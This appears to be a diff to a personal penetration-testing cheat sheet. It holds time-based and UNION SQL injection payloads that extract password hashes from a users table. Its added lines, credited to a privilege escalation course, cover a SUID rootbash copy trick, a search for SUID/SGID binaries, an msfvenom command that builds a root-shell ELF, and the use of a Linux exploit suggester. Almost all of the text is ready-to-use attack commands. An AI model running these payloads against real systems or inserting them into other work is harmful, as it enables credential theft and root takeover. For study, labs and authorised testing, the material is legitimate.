@@ -516,7 +516,8 @@ butch';IF (SUBSTRING((SELECT TOP 1 name FROM syscolumns WHERE id = (SELECT id FR
 butch';IF (SUBSTRING((SELECT TOP 1 password_hash FROM users),1,1)='a') WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--
 
 admin' UNION SELECT username,password_hash FROM users; --
-
+----------------------------------------------------------------------------------
+###From Priv Esc course by Tib3rius:
 Dont take a reverse shell do this instead:
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
@@ -529,3 +530,15 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
 Create an elf file to run a custom command using msfvenom:
 msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
+
+Run linux exploit suggester 2 like this: 
+https://github.com/jondonas/linux-exploit-suggester-2
+./linux-exploit-suggester-2.pl –k 2.6.32  <- (This is kernal version)
+
+Show all processes running as root:
+ps aux | grep "^root"
+
+On Debian-like distributions, dpkg can show installed programs and their version:
+dpkg -l | grep <program>
+
+
